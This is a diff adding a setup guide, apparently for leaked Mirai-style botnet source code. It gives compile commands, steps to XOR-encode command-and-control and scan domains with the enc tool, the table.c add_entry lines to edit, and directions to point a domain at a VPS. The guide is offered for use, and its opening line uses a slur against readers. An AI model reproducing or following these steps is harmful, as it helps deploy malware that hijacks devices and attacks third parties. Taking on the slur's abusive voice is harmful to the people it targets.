@@ -1,0 +1,24 @@
+Reason Im Droppin This Is Because Unstable Banned Me And Blocked Me Cause, I Commented Sum Shit On His YT So Ya Free Garbage He Is Selling For $100 For Free So No One Knows How TO Setup A Domain Cause Half Of You Are Retards
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+1. gcc enc.c -o enc -pthread
+
+CNC String 2. ./enc string "www.example.com" This Could Be Anything Like boomer.yeet.cf 
+
+Scan String 3. ./enc string "scan.example.com" This Can Be Anything But, This can just be scan.yeet.cf cause your connection to the one above
+
+4. Go To The Table.c in bot folder line 19 and 20 Put The CNC String in here \/ And Change The Bye Size right here      \/
+add_entry(TABLE_CNC_DOMAIN, "\x67\x6A\x77\x69\x65\x67\x67\x65\x77\x2A\x60\x71\x67\x6F\x60\x6A\x77\x2A\x6B\x76\x63\x04", 22); // 
+4 Continued. Then Change Your Scan String With Your Scan String And Change The Byte Size
+add_entry(TABLE_SCAN_DOMAIN, "\x77\x67\x65\x6A\x69\x65\x67\x67\x65\x77\x2A\x60\x71\x67\x6F\x60\x6A\x77\x2A\x6B\x76\x63\x04", 23); // 
+Both \x67\x6A\x77\x69\x65\x67\x67\x65\x77\x2A\x60\x71\x67\x6F\x60\x6A\x77\x2A\x6B\x76\x63\x04 and 22 will Change
+
+After That The Domain You Use Will Need To Be Pointed To Your Vps So I'f You Don't have a domain and your a broke boy go on Freenom and grab you any free domain and xor them with the enc like i did in the example 2 and 3
+And Then Change All The Ips In The Rest Of The Files Then Compile Gooluck If YOu Need any help just dm Me
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+Woah.#0420
+Woah.#0420
+Woah.#0420
+Woah.#0420
+Woah.#0420
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
